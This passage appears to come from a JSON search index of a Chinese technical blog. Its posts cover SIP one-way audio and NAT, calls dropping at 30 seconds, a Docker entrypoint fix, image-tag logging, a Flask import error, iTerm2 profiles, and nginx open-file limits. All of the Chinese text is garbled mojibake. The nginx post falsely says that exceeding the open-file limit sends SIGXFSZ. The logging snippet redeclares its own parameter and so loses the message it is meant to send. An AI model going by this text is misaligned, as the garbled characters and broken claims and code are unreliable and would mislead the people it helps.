æ¯ä¸ªlegä¸Šçš„è¯­éŸ³æµæ”¶å‘çš„æƒ…å†µã€‚\nä»ä¿¡ä»¤çš„çš„sdpä¸­åˆ†æï¼Œè¿™ä¸ªéœ€è¦ä¸€å®šçš„SIPåè®®çš„åˆ†æèƒ½åŠ›ã€‚æœ‰äº›æ—¶å€™ï¼Œsdpé‡Œé¢çš„åª’ä½“åœ°å€ä¸æ­£ç¡®ï¼Œä¹Ÿä¼šå¯¼è‡´åª’ä½“æµæ— æ³•æ­£å¸¸é¦–å‘ã€‚ NATç­–ç•¥ã€‚NATä¸€èˆ¬æœ‰å››ç§ï¼Œç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ç«¯å£é™åˆ¶å‹ã€‚è¿™ç§NATè¦æ±‚å¤–ç½‘æµé‡åœ¨è¿›å…¥NATå†…éƒ¨æ—¶ï¼Œå¿…éœ€å…ˆæœ‰å†…éƒ¨çš„æµé‡å‡ºå»ã€‚å½“å†…éƒ¨æµé‡å‡ºå»ä¹‹åï¼Œè¿™ä¸ªNATæ´æ‰ä¼šå‡ºç°ï¼Œå¤–éƒ¨çš„æµé‡æ‰èƒ½ä»è¿™ä¸ªæ´è¿›å…¥ã€‚å¦‚æœNATå†…éƒ¨è®¾å¤‡ä¸€ç›´ä¸å‘é€rtpåŒ…ï¼Œé‚£ä¹ˆå¤–éƒ¨çš„æµé‡å³ä½¿è¿›æ¥ï¼Œä¹Ÿä¼šè¢«é˜²ç«å¢™æ‹¦æˆªæ‰ã€‚ æ— è®ºæ˜¯è¿ç»´äººå‘˜è¿˜æ˜¯å¼€å‘äººå‘˜ï¼Œåœ¨é‡åˆ°åª’ä½“æµé—®é¢˜æ—¶ï¼Œä¸€å®šè¦å…ˆææ¸…æ¥šæ•´ä¸ªè½¯äº¤æ¢çš„ç½‘ç»œæ‹“æ‰‘æ¶æ„ã€‚å¦åˆ™åªèƒ½å—è¾•åŒ—è¾™ã€‚ sngrep -cr, åŠ ä¸Šrè¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥å®æ—¶è§‚å¯Ÿåª’ä½“æµçš„æµåŠ¨æƒ…å†µã€‚æ˜¯ä¸ªéå¸¸å¥½çš„åŠŸèƒ½ã€‚ä½†æ˜¯å¯¹äºé‚£ç§åŠ å¯†çš„åª’ä½“æµï¼Œsngrepæ˜¯æŠ“ä¸åˆ°çš„ï¼Œè¿™ç‚¹è¦æ³¨æ„ã€‚å¸¸è§çš„WebRTCçš„åª’ä½“æµå°±æ˜¯åŠ å¯†çš„ã€‚ æœ€ç»ˆå¦‚æœè¿˜æ˜¯è§£å†³ä¸äº†ï¼Œé‚£ä¹ˆåªèƒ½ç¥­å‡ºæœ€åçš„æ€å™¨ï¼štcpdump + wiresharkã€‚æœåŠ¡ç«¯æŠ“åŒ…çš„è¯ï¼Œè™½ç„¶sngrepå¯ä»¥æŠ“åŒ…ï¼Œä½†æ˜¯æ¯”è¾ƒæµªè´¹å†…å­˜è¿˜å¯èƒ½ä¼šå‡ºç°ä¸¢åŒ…ã€‚æœ€å¥½ç”¨tcpdumpæŠ“åŒ…æˆæ–‡ä»¶ï¼Œç„¶ååœ¨wiresharkä¸Šåˆ†æã€‚ ","permalink":"https://wdd.js.org/opensips/ch7/one-leg-audio/","summary":" è¿™ä¸ªé—®é¢˜å¾ˆå¤§å¯èƒ½å’Œå’ŒSDPæ²¡æœ‰æ­£ç¡®ä¿®æ”¹æœ‰å…³ã€‚éœ€è¦æ’æŸ¥SIPä¿¡ä»¤çš„sdpåœ°å€æ˜¯å¦æ­£ç¡®ã€‚ é˜²ç«å¢™ç­–ç•¥é—®é¢˜ï¼šæœ‰çš„ç½‘ç»œå…è®¸udpå‡ºå»ï¼Œä½†æ˜¯ä¸å…è®¸udpè¿›æ¥ã€‚éœ€è¦è®¾ç½®é˜²ç«å¢™ç­–ç•¥ã€‚ udpç«¯å£èŒƒå›´å¤ªå°ã€‚ä¸€èˆ¬ä¸€ä¸ªé€šè¯éœ€è¦å ç”¨4ä¸ªudpç«¯å£ã€‚å¦‚æœå¼€æ”¾çš„udpç«¯å£å¤ªå°‘ï¼Œåœ¨é€šè¯è¾¾åˆ°ä¸€å®šæ•°é‡åï¼Œå°±ä¼šå‡ºç°ä¸€éƒ¨åˆ†å‘¼å«æ²¡æœ‰å¯ç”¨ç«¯å£ã€‚ ç”¨æˆ·è®¾å¤‡çš„é—®é¢˜ã€‚ä¾‹å¦‚ç”¨æˆ·çš„ç”µè„‘å£°å¡æˆ–è€…æ‰¬å£°å™¨å‡ºç°é—®é¢˜ã€‚ ç”±äºç½‘ç»œçš„å¤æ‚æ€§ï¼Œè¿˜æœ‰å¾ˆå¤šå¯èƒ½ ä¸€èˆ¬é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥æŒ‰ç…§å¦‚ä¸‹çš„æ€è·¯æ’æŸ¥ï¼š\næœåŠ¡ç«¯æœ‰å½•éŸ³åŠŸèƒ½çš„ï¼Œå¯ä»¥å…ˆåœ¨æœåŠ¡ç«¯å¬å½•éŸ³ï¼Œçœ‹çœ‹æœåŠ¡ç«¯å½•éŸ³é‡Œæ˜¯å¦æ­£å¸¸ã€‚ä¸€èˆ¬æ¥è¯´æœ‰å››ç§æƒ…å†µã€‚ ä¸¤æ–¹çš„å½•éŸ³éƒ½æ²¡æœ‰ ä¸»å«æ–¹æœ‰ï¼Œè¢«å«æ–¹æ²¡æœ‰ è¢«å«æ–¹æœ‰ï¼Œä¸»å«æ–¹æ²¡æœ‰ ä¸»è¢«å«éƒ½æœ‰ã€‚ä½†æ˜¯å°±æ˜¯ä¸€æ–¹å¬ä¸åˆ°å¦ä¸€æ–¹ã€‚ é€šè¿‡æ’æŸ¥æœåŠ¡ç«¯çš„å½•éŸ³ï¼Œå°±å¯ä»¥å¤§è‡´çŸ¥é“åˆ°åº•æ˜¯ABä¸¤ä¸ªleg, æ¯ä¸ªlegä¸Šçš„è¯­éŸ³æµæ”¶å‘çš„æƒ…å†µã€‚\nä»ä¿¡ä»¤çš„çš„sdpä¸­åˆ†æï¼Œè¿™ä¸ªéœ€è¦ä¸€å®šçš„SIPåè®®çš„åˆ†æèƒ½åŠ›ã€‚æœ‰äº›æ—¶å€™ï¼Œsdpé‡Œé¢çš„åª’ä½“åœ°å€ä¸æ­£ç¡®ï¼Œä¹Ÿä¼šå¯¼è‡´åª’ä½“æµæ— æ³•æ­£å¸¸é¦–å‘ã€‚ NATç­–ç•¥ã€‚NATä¸€èˆ¬æœ‰å››ç§ï¼Œç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ç«¯å£é™åˆ¶å‹ã€‚è¿™ç§NATè¦æ±‚å¤–ç½‘æµé‡åœ¨è¿›å…¥NATå†…éƒ¨æ—¶ï¼Œå¿…éœ€å…ˆæœ‰å†…éƒ¨çš„æµé‡å‡ºå»ã€‚å½“å†…éƒ¨æµé‡å‡ºå»ä¹‹åï¼Œè¿™ä¸ªNATæ´æ‰ä¼šå‡ºç°ï¼Œå¤–éƒ¨çš„æµé‡æ‰èƒ½ä»è¿™ä¸ªæ´è¿›å…¥ã€‚å¦‚æœNATå†…éƒ¨è®¾å¤‡ä¸€ç›´ä¸å‘é€rtpåŒ…ï¼Œé‚£ä¹ˆå¤–éƒ¨çš„æµé‡å³ä½¿è¿›æ¥ï¼Œä¹Ÿä¼šè¢«é˜²ç«å¢™æ‹¦æˆªæ‰ã€‚ æ— è®ºæ˜¯è¿ç»´äººå‘˜è¿˜æ˜¯å¼€å‘äººå‘˜ï¼Œåœ¨é‡åˆ°åª’ä½“æµé—®é¢˜æ—¶ï¼Œä¸€å®šè¦å…ˆææ¸…æ¥šæ•´ä¸ªè½¯äº¤æ¢çš„ç½‘ç»œæ‹“æ‰‘æ¶æ„ã€‚å¦åˆ™åªèƒ½å—è¾•åŒ—è¾™ã€‚ sngrep -cr, åŠ ä¸Šrè¿™ä¸ªå‚æ•°ï¼Œå¯ä»¥å®æ—¶è§‚å¯Ÿåª’ä½“æµçš„æµåŠ¨æƒ…å†µã€‚æ˜¯ä¸ªéå¸¸å¥½çš„åŠŸèƒ½ã€‚ä½†æ˜¯å¯¹äºé‚£ç§åŠ å¯†çš„åª’ä½“æµï¼Œsngrepæ˜¯æŠ“ä¸åˆ°çš„ï¼Œè¿™ç‚¹è¦æ³¨æ„ã€‚å¸¸è§çš„WebRTCçš„åª’ä½“æµå°±æ˜¯åŠ å¯†çš„ã€‚ æœ€ç»ˆå¦‚æœè¿˜æ˜¯è§£å†³ä¸äº†ï¼Œé‚£ä¹ˆåªèƒ½ç¥­å‡ºæœ€åçš„æ€å™¨ï¼štcpdump + wiresharkã€‚æœåŠ¡ç«¯æŠ“åŒ…çš„è¯ï¼Œè™½ç„¶sngrepå¯ä»¥æŠ“åŒ…ï¼Œä½†æ˜¯æ¯”è¾ƒæµªè´¹å†…å­˜è¿˜å¯èƒ½ä¼šå‡ºç°ä¸¢åŒ…ã€‚æœ€å¥½ç”¨tcpdumpæŠ“åŒ…æˆæ–‡ä»¶ï¼Œç„¶ååœ¨wiresharkä¸Šåˆ†æã€‚ ","title":"ä¸€æ–¹å¬ä¸åˆ°å¦å¤–ä¸€æ–¹çš„å£°éŸ³"},{"content":"åœ¨é€šè¯æ¥è¿‘30ç§’æ—¶ï¼Œå‘¼å«è‡ªåŠ¨æŒ‚æ–­ã€‚\næœ‰å¾ˆå¤§çš„å¯èƒ½å’Œä¸¢å¤±äº†ACKæœ‰å…³ã€‚è¿™ä¸ªéœ€è¦ç”¨sngrepå»æŠ“åŒ…çœ‹SIPæ—¶åºå›¾æ¥ç¡®å®šæ˜¯å¦æ˜¯ACKä¸¢å¤±ã€‚\nä¸¢å¤±ACKçš„åŸå› å¾ˆå¤§å¯èƒ½æ˜¯NATæ²¡æœ‰å¤„ç†å¥½ï¼Œæˆ–è€…æ˜¯ç½‘ç»œåè®®ä¸åŒ¹é…ç­‰ç­‰ã€‚\n","permalink":"https://wdd.js.org/opensips/ch7/30-seconds-drop/","summary":"åœ¨é€šè¯æ¥è¿‘30ç§’æ—¶ï¼Œå‘¼å«è‡ªåŠ¨æŒ‚æ–­ã€‚\næœ‰å¾ˆå¤§çš„å¯èƒ½å’Œä¸¢å¤±äº†ACKæœ‰å…³ã€‚è¿™ä¸ªéœ€è¦ç”¨sngrepå»æŠ“åŒ…çœ‹SIPæ—¶åºå›¾æ¥ç¡®å®šæ˜¯å¦æ˜¯ACKä¸¢å¤±ã€‚\nä¸¢å¤±ACKçš„åŸå› å¾ˆå¤§å¯èƒ½æ˜¯NATæ²¡æœ‰å¤„ç†å¥½ï¼Œæˆ–è€…æ˜¯ç½‘ç»œåè®®ä¸åŒ¹é…ç­‰ç­‰ã€‚","title":"30ç§’è‡ªåŠ¨æŒ‚æ–­"},{"content":"exec user process caused \u0026#34;no such file or diectory\u0026#34; è§£å†³æ–¹æ¡ˆï¼š å°†é•œåƒæ„å»ºçš„ Dockerfile ENTRYPOINT [\u0026quot;/run.sh\u0026quot;] æ”¹ä¸ºä¸‹é¢çš„\nENTRYPOINT [\u0026#34;sh\u0026#34;,\u0026#34;/run.sh\u0026#34;] å…¶å®å°±æ˜¯åŠ äº†ä¸ªsh\n","permalink":"https://wdd.js.org/posts/2020/07/docker-exec-user-process/","summary":"exec user process caused \u0026#34;no such file or diectory\u0026#34; è§£å†³æ–¹æ¡ˆï¼š å°†é•œåƒæ„å»ºçš„ Dockerfile ENTRYPOINT [\u0026quot;/run.sh\u0026quot;] æ”¹ä¸ºä¸‹é¢çš„\nENTRYPOINT [\u0026#34;sh\u0026#34;,\u0026#34;/run.sh\u0026#34;] å…¶å®å°±æ˜¯åŠ äº†ä¸ªsh","title":"exec user process caused no such file or diectory"},{"content":"function report(msg:string){ var msg = new Image() msg.src = `/report?log=${msg}` } report ","permalink":"https://wdd.js.org/posts/2020/07/koow4y/","summary":"function report(msg:string){ var msg = new Image() msg.src = `/report?log=${msg}` } report ","title":"ä½¿ç”¨imageæ ‡ç­¾ä¸Šä¼ æ—¥å¿—"},{"content":"python Flaskæ¡†æ¶æŠ¥é”™ã€‚åˆšå¼€å§‹æˆ‘åªå…³æ³¨äº†è¿™ä¸ªæŠ¥é”™ï¼Œæ²¡æœ‰çœ‹åˆ°è¿™ä¸ªæŠ¥é”™ä¸Šä¸Šé¢è¿˜æœ‰ä¸€ä¸ªæŠ¥é”™\nModuleNotFoundError: No module named \u0026#39;http.client\u0026#39;; \u0026#39;http\u0026#39; is not a package å®é™…ä¸Šé—®é¢˜çš„å…³é”®å…¶å®æ˜¯ 'http' is not a packageÂ , ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªæŠ¥é”™å‘¢ï¼Ÿ\nå…¶å®å› ä¸ºæˆ‘è‡ªå·±åœ¨é¡¹ç›®ç›®å½•é‡Œæ–°å»ºä¸€ä¸ªå«åšhttp.pyçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åå’Œpythonçš„æ ‡å‡†åº“é‡åäº†ï¼Œå°±å¯¼è‡´äº†åç»­çš„ä¸€ç³»åˆ—çš„é—®é¢˜ã€‚\né—®é¢˜æ€»ç»“ æ–‡ä»¶åä¸€å®šä¸è¦å’ŒæŸäº›æ ‡å‡†åº“çš„æ–‡ä»¶åç›¸åŒ æ’æŸ¥é—®é¢˜çš„æ—¶å€™ï¼Œä¸€å®šè¦é¦–å…ˆæ’æŸ¥æœ€å…ˆå‡ºç°é—®é¢˜çš„ç‚¹ ","permalink":"https://wdd.js.org/posts/2020/07/ncigfk/","summary":"python Flaskæ¡†æ¶æŠ¥é”™ã€‚åˆšå¼€å§‹æˆ‘åªå…³æ³¨äº†è¿™ä¸ªæŠ¥é”™ï¼Œæ²¡æœ‰çœ‹åˆ°è¿™ä¸ªæŠ¥é”™ä¸Šä¸Šé¢è¿˜æœ‰ä¸€ä¸ªæŠ¥é”™\nModuleNotFoundError: No module named \u0026#39;http.client\u0026#39;; \u0026#39;http\u0026#39; is not a package å®é™…ä¸Šé—®é¢˜çš„å…³é”®å…¶å®æ˜¯ 'http' is not a packageÂ , ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªæŠ¥é”™å‘¢ï¼Ÿ\nå…¶å®å› ä¸ºæˆ‘è‡ªå·±åœ¨é¡¹ç›®ç›®å½•é‡Œæ–°å»ºä¸€ä¸ªå«åšhttp.pyçš„æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åå’Œpythonçš„æ ‡å‡†åº“é‡åäº†ï¼Œå°±å¯¼è‡´äº†åç»­çš„ä¸€ç³»åˆ—çš„é—®é¢˜ã€‚\né—®é¢˜æ€»ç»“ æ–‡ä»¶åä¸€å®šä¸è¦å’ŒæŸäº›æ ‡å‡†åº“çš„æ–‡ä»¶åç›¸åŒ æ’æŸ¥é—®é¢˜çš„æ—¶å€™ï¼Œä¸€å®šè¦é¦–å…ˆæ’æŸ¥æœ€å…ˆå‡ºç°é—®é¢˜çš„ç‚¹ ","title":"ModuleNotFoundError: No module named 'SocketServer'"},{"content":"iTermæˆ‘å·²ç»ä½¿ç”¨äº†å¾ˆé•¿æ—¶é—´äº†ï¼Œæ€»ä½“å„æ–¹é¢çš„ç‰¹ç‚¹éƒ½éå¸¸å¥½ï¼Œä½†æ˜¯æœ‰å‡ ä¸ªåœ°æ–¹ä¹Ÿæ˜¯è®©æˆ‘è‹¦æ¼çš„åœ°æ–¹ã€‚\ntab é¡µé¢çš„æ ‡é¢˜ä¼šæ ¹æ®æ‰§è¡Œçš„å‘½ä»¤æˆ–è€…è·¯å¾„å‘ç”Ÿå˜åŒ–ï¼Œå¦‚æœä½ å¼€äº†ä¸ƒå…«ä¸ªsshè¿œç¨‹ï¼Œæœ‰æ—¶å€™å¾ˆéš¾åŒºåˆ†è¿™ä¸ªtabé¡µé¢åˆ°åº•æ˜¯è¿æ¥çš„å“ªå°æœºå™¨ã€‚ å¦‚æœä½ æœ‰åå‡ ä¸ªæœºå™¨éœ€è¦è¿æ¥ï¼Œä½ ä¸å¯èƒ½æ‰‹åŠ¨è¾“å…¥ssh root@ipåœ°å€çš„æ–¹å¼å»è¿æ¥ï¼Œå¤ªå¤šäº†è®°ä¸ä½ã€‚ å¦‚ä½•ç»´æŠ¤å¤šä¸ªè¿œç¨‹host? ä½¿ç”¨profileç»´æŠ¤å¤šä¸ªè¿œç¨‹host, æ¯ä¸ªprofileå¯¹åº”è¿æ¥åˆ°ä¸€å°æœºå™¨ã€‚profile nameå¡«å…¥è¯¥hostçš„åå­—ã€‚\næ³¨æ„å³è¾¹çš„Command, Send text at startçš„è¾“å…¥æ¡†ï¼Œè¿™ä¸ªè¾“å…¥æ¡†ï¼Œå°±æ˜¯è¦æ‰§è¡Œçš„sshæŒ‡ä»¤ï¼Œé‡Œé¢åŒ…å«äº†è¿œç¨‹hostçš„åœ°å€ã€‚\nç„¶åä½ å°±å¯ä»¥åœ¨Profilsçš„èœå•ä¸­é€‰æ‹©ä¸€ä¸ªprofileè¿›è¡Œè¿æ¥äº†ã€‚\nå¦‚ä½•è®©tabé¡µé¢çš„æ ‡é¢˜ä¸æ”¹å˜ï¼Ÿ ä¸€å®šä¸è¦å‹¾é€‰Applications in terminal may change the title, é»˜è®¤è¿™é¡¹æ˜¯å‹¾é€‰çš„ã€‚ Ttileä¸€å®šè¦é€‰æ‹©Name, badgeçš„å¦™ç”¨ï¼Ÿ å¦‚æœæ ‡ç­¾é¡µçš„tabçš„åç§°è¿˜ä¸å¤Ÿå¼ºè°ƒå½“å‰tabé¡µé¢æ˜¯è¿æ¥å“ªä¸ªæ ‡ç­¾é¡µé¢çš„ï¼Œä½ å¯ä»¥ç”¨ç”¨Badgeå»å¼ºè°ƒä¸€ä¸‹ã€‚\n","permalink":"https://wdd.js.org/posts/2020/06/ba84a7/","summary":"iTermæˆ‘å·²ç»ä½¿ç”¨äº†å¾ˆé•¿æ—¶é—´äº†ï¼Œæ€»ä½“å„æ–¹é¢çš„ç‰¹ç‚¹éƒ½éå¸¸å¥½ï¼Œä½†æ˜¯æœ‰å‡ ä¸ªåœ°æ–¹ä¹Ÿæ˜¯è®©æˆ‘è‹¦æ¼çš„åœ°æ–¹ã€‚\ntab é¡µé¢çš„æ ‡é¢˜ä¼šæ ¹æ®æ‰§è¡Œçš„å‘½ä»¤æˆ–è€…è·¯å¾„å‘ç”Ÿå˜åŒ–ï¼Œå¦‚æœä½ å¼€äº†ä¸ƒå…«ä¸ªsshè¿œç¨‹ï¼Œæœ‰æ—¶å€™å¾ˆéš¾åŒºåˆ†è¿™ä¸ªtabé¡µé¢åˆ°åº•æ˜¯è¿æ¥çš„å“ªå°æœºå™¨ã€‚ å¦‚æœä½ æœ‰åå‡ ä¸ªæœºå™¨éœ€è¦è¿æ¥ï¼Œä½ ä¸å¯èƒ½æ‰‹åŠ¨è¾“å…¥ssh root@ipåœ°å€çš„æ–¹å¼å»è¿æ¥ï¼Œå¤ªå¤šäº†è®°ä¸ä½ã€‚ å¦‚ä½•ç»´æŠ¤å¤šä¸ªè¿œç¨‹host? ä½¿ç”¨profileç»´æŠ¤å¤šä¸ªè¿œç¨‹host, æ¯ä¸ªprofileå¯¹åº”è¿æ¥åˆ°ä¸€å°æœºå™¨ã€‚profile nameå¡«å…¥è¯¥hostçš„åå­—ã€‚\næ³¨æ„å³è¾¹çš„Command, Send text at startçš„è¾“å…¥æ¡†ï¼Œè¿™ä¸ªè¾“å…¥æ¡†ï¼Œå°±æ˜¯è¦æ‰§è¡Œçš„sshæŒ‡ä»¤ï¼Œé‡Œé¢åŒ…å«äº†è¿œç¨‹hostçš„åœ°å€ã€‚\nç„¶åä½ å°±å¯ä»¥åœ¨Profilsçš„èœå•ä¸­é€‰æ‹©ä¸€ä¸ªprofileè¿›è¡Œè¿æ¥äº†ã€‚\nå¦‚ä½•è®©tabé¡µé¢çš„æ ‡é¢˜ä¸æ”¹å˜ï¼Ÿ ä¸€å®šä¸è¦å‹¾é€‰Applications in terminal may change the title, é»˜è®¤è¿™é¡¹æ˜¯å‹¾é€‰çš„ã€‚ Ttileä¸€å®šè¦é€‰æ‹©Name, badgeçš„å¦™ç”¨ï¼Ÿ å¦‚æœæ ‡ç­¾é¡µçš„tabçš„åç§°è¿˜ä¸å¤Ÿå¼ºè°ƒå½“å‰tabé¡µé¢æ˜¯è¿æ¥å“ªä¸ªæ ‡ç­¾é¡µé¢çš„ï¼Œä½ å¯ä»¥ç”¨ç”¨Badgeå»å¼ºè°ƒä¸€ä¸‹ã€‚","title":"iTerm2æŠ€å·§ ç»´æŠ¤å¤šä¸ªhostä¸å›ºå®štabé¡µé¢æ ‡é¢˜"},{"content":" é¦–å…ˆå»å®˜ç½‘æŸ¥çœ‹ä¸€ä¸‹ï¼Œmacosçš„ç³»ç»Ÿç‰ˆæœ¬å’Œç¡¬ä»¶ä»¥åŠipadçš„ç‰ˆæœ¬æ˜¯å¦æ”¯æŒéšèˆªã€‚è¿™æ˜¯å‰ææ¡ä»¶ã€‚ macos å’Œ ipad éœ€è¦ç™»å½•åŒä¸€ä¸ªAppleID macoså’ŒiPadéœ€è¦åœ¨åŒä¸€ä¸ªWi-Fiä¸‹ é‡åˆ°æŠ¥é”™æç¤ºé“¾æ¥è¶…æ—¶æ—¶ï¼š\nMacOS é€€å‡ºappleè´¦å·ï¼Œç„¶åé‡æ–°ç™»å½•ï¼Œç™»å½•å®Œäº†ä¹‹åé‡å¯ç”µè„‘ å†æ¬¡å°è¯•è¿æ¥ï¼Œå°±å¯ä»¥è¿æ¥æˆåŠŸäº†ã€‚\n","permalink":"https://wdd.js.org/posts/2020/06/yh0oty/","summary":"é¦–å…ˆå»å®˜ç½‘æŸ¥çœ‹ä¸€ä¸‹ï¼Œmacosçš„ç³»ç»Ÿç‰ˆæœ¬å’Œç¡¬ä»¶ä»¥åŠipadçš„ç‰ˆæœ¬æ˜¯å¦æ”¯æŒéšèˆªã€‚è¿™æ˜¯å‰ææ¡ä»¶ã€‚ macos å’Œ ipad éœ€è¦ç™»å½•åŒä¸€ä¸ªAppleID macoså’ŒiPadéœ€è¦åœ¨åŒä¸€ä¸ªWi-Fiä¸‹ é‡åˆ°æŠ¥é”™æç¤ºé“¾æ¥è¶…æ—¶æ—¶ï¼š\nMacOS é€€å‡ºappleè´¦å·ï¼Œç„¶åé‡æ–°ç™»å½•ï¼Œç™»å½•å®Œäº†ä¹‹åé‡å¯ç”µè„‘ å†æ¬¡å°è¯•è¿æ¥ï¼Œå°±å¯ä»¥è¿æ¥æˆåŠŸäº†ã€‚","title":"MacOS éšèˆªåŠŸèƒ½é“¾æ¥ipadè¶…æ—¶"},{"content":"macos å‡çº§åï¼Œå‘ç°gitç­‰å‘½ä»¤éƒ½ä¸å¯ç”¨äº†ã€‚\nç¬¬ä¸€æ¬¡ä½¿ç”¨xcode-select \u0026ndash;install, æœ‰æŠ¥é”™ã€‚äºæ˜¯å°±ç”¨brew å®‰è£…äº†gitã€‚\nxcode-select --install åç»­ä½¿ç”¨å…¶ä»–å‘½ä»¤æ˜¯ï¼Œå‘ç°gccå‘½ä»¤ä¹Ÿä¸å¯ç”¨ã€‚äºæ˜¯ç¬¬äºŒå¤©åˆç”¨ xcode-select --installÂ æ‰§è¡Œäº†ä¸€éï¼Œå¿½ç„¶åˆå¯ä»¥æ­£å¸¸å®‰è£…å¼€å‘è½¯ä»¶äº†ã€‚\næ‰€ä»¥åˆæŠŠbrew å®‰è£…çš„gitç»™å¸è½½äº†ã€‚\n","permalink":"https://wdd.js.org/posts/2020/06/wetv3e/","summary":"macos å‡çº§åï¼Œå‘ç°gitç­‰å‘½ä»¤éƒ½ä¸å¯ç”¨äº†ã€‚\nç¬¬ä¸€æ¬¡ä½¿ç”¨xcode-select \u0026ndash;install, æœ‰æŠ¥é”™ã€‚äºæ˜¯å°±ç”¨brew å®‰è£…äº†gitã€‚\nxcode-select --install åç»­ä½¿ç”¨å…¶ä»–å‘½ä»¤æ˜¯ï¼Œå‘ç°gccå‘½ä»¤ä¹Ÿä¸å¯ç”¨ã€‚äºæ˜¯ç¬¬äºŒå¤©åˆç”¨ xcode-select --installÂ æ‰§è¡Œäº†ä¸€éï¼Œå¿½ç„¶åˆå¯ä»¥æ­£å¸¸å®‰è£…å¼€å‘è½¯ä»¶äº†ã€‚\næ‰€ä»¥åˆæŠŠbrew å®‰è£…çš„gitç»™å¸è½½äº†ã€‚","title":"xcrun: error: invalid active developer path"},{"content":"æœ€è¿‘é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼ŒWebSocketæ€»æ˜¯ä¼šåœ¨ä¸‹åˆå‡ºç°æ¯”è¾ƒå¤§çš„æ–­å¼€çš„é‡ã€‚\né¦–å…ˆæ€€ç–‘çš„æ˜¯å®¢æˆ·ç«¯çš„ç½‘ç»œåˆ°æœåŠ¡ç«¯çš„ç½‘ç»œå‡ºç°æŠ–åŠ¨æˆ–è€…æ–­å¼€ï¼Œè¦ä¹ˆå°±æ˜¯å…¥å£çš„nginxæœ‰å¼‚å¸¸ï¼Œæˆ–è€…æ˜¯å†…éƒ¨çš„æœåŠ¡å‡ºç°å¼‚å¸¸ã€‚\næ’æŸ¥ä¸‹æ¥ï¼Œå‘ç°nginxçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶ä¸ªæ•°æ˜¯1024\nnginx masterè¿›ç¨‹\nnginx workè¿›ç¨‹\nå½“è¿›ç¨‹æ‰“å¼€æ–‡ä»¶æ•°è¶…è¿‡é™åˆ¶æ—¶ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ å½“è¿›ç¨‹è¶…è¿‡æœ€å¤§æ‰“å¼€æ–‡ä»¶é™åˆ¶æ—¶ï¼Œä¼šæ”¶åˆ°SIGXFSZä¿¡å·ã€‚è¿™ä¸ªä¿¡å·ä¼šé»˜è®¤è¡Œä¸ºä¼šæ€æ­»ä¸€ä¸ªè¿›ç¨‹ã€‚è¿›ç¨‹å†…éƒ¨ä¹Ÿå¯ä»¥æ•è·è¿™ä¸ªä¿¡å·ã€‚\næˆ‘è¯•ç€å‘nginx wrokè¿›ç¨‹å‘é€SIGXFSZä¿¡å·, workè¿›ç¨‹ä¼šé€€å‡ºï¼Œç„¶åmasterç›‘å¬äº†è¿™ä¸ªäº‹ä»¶åï¼Œä¼šé‡æ–°å¯åŠ¨ä¸€ä¸ªworkè¿›ç¨‹ã€‚\nkill -XFSZ work_pid åœ¨nginxçš„error.logæ–‡ä»¶ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„æ—¥å¿—è¾“å‡ºã€‚\nè¿™é‡Œçš„25å°±æ˜¯XFSZä¿¡å·çš„æ•´æ•°è¡¨ç¤ºã€‚\n... [alert] ...#.: work process ... exited on signal 25 _\nå‚è€ƒ https://www.monitis.com/blog/6-best-practices-for-optimizing-your-nginx-performance/ https://www.cnblogs.com/shansongxian/p/9989631.html https://www.cnblogs.com/jpfss/p/9755706.html https://man7.org/linux/man-pages/man2/getrlimit.2.html https://man7.org/linux/man-pages/man5/proc.5.html ","permalink":"https://wdd.js.org/posts/2020/06/rlmqq8/","summary":"æœ€è¿‘é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼ŒWebSocketæ€»æ˜¯ä¼šåœ¨ä¸‹åˆå‡ºç°æ¯”è¾ƒå¤§çš„æ–­å¼€çš„é‡ã€‚\né¦–å…ˆæ€€ç–‘çš„æ˜¯å®¢æˆ·ç«¯çš„ç½‘ç»œåˆ°æœåŠ¡ç«¯çš„ç½‘ç»œå‡ºç°æŠ–åŠ¨æˆ–è€…æ–­å¼€ï¼Œè¦ä¹ˆå°±æ˜¯å…¥å£çš„nginxæœ‰å¼‚å¸¸ï¼Œæˆ–è€…æ˜¯å†…éƒ¨çš„æœåŠ¡å‡ºç°å¼‚å¸¸ã€‚\næ’æŸ¥ä¸‹æ¥ï¼Œå‘ç°nginxçš„æœ€å¤§æ‰“å¼€æ–‡ä»¶ä¸ªæ•°æ˜¯1024\nnginx masterè¿›ç¨‹\nnginx workè¿›ç¨‹\nå½“è¿›ç¨‹æ‰“å¼€æ–‡ä»¶æ•°è¶…è¿‡é™åˆ¶æ—¶ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ å½“è¿›ç¨‹è¶…è¿‡æœ€å¤§æ‰“å¼€æ–‡ä»¶é™åˆ¶æ—¶ï¼Œä¼šæ”¶åˆ°SIGXFSZä¿¡å·ã€‚è¿™ä¸ªä¿¡å·ä¼šé»˜è®¤è¡Œä¸ºä¼šæ€æ­»ä¸€ä¸ªè¿›ç¨‹ã€‚è¿›ç¨‹å†…éƒ¨ä¹Ÿå¯ä»¥æ•è·è¿™ä¸ªä¿¡å·ã€‚\næˆ‘è¯•ç€å‘nginx wrokè¿›ç¨‹å‘é€SIGXFSZä¿¡å·, workè¿›ç¨‹ä¼šé€€å‡ºï¼Œç„¶åmasterç›‘å¬äº†è¿™ä¸ªäº‹ä»¶åï¼Œä¼šé‡æ–°å¯åŠ¨ä¸€ä¸ªworkè¿›ç¨‹ã€‚\nkill -XFSZ work_pid åœ¨nginxçš„error.logæ–‡ä»¶ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„æ—¥å¿—è¾“å‡ºã€‚\nè¿™é‡Œçš„25å°±æ˜¯XFSZä¿¡å·çš„æ•´æ•°è¡¨ç¤ºã€‚\n... [alert] ...#.: work process ... exited on signal 25 _\nå‚è€ƒ https://www.monitis.com/blog/6-best-practices-for-optimizing-your-nginx-performance/ https://www.cnblogs.com/shansongxian/p/9989631.html https://www.cnblogs.com/jpfss/p/9755706.html 